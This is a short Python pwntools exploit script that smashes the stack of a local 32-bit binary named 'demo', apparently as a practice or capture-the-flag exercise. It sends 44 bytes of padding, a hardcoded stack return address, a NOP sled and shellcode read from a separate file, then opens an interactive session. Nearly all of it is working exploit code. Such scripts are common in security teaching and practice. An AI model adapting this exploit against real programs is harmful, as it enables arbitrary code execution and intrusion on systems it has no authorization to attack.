#!/usr/bin/python3
from pwn import *

context(arch="i386", os="linux")

elf = context.binary = ELF("./demo")


gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)




io = start()


def open_shellcode(f):
    fd = open(f, "rb")
    buf = fd.read()
    fd.close()
    return buf


#=========================================
#            Exploit Here                #
#=========================================

stack_addr = p32(0xffffd620)

nop_sled = p8(0x90)*0x100

shellcode = open_shellcode("./shellcode.bin")
payload = nop_sled + shellcode

buf = b'A'*44 + stack_addr + payload
io.sendline(buf)
io.interactive()

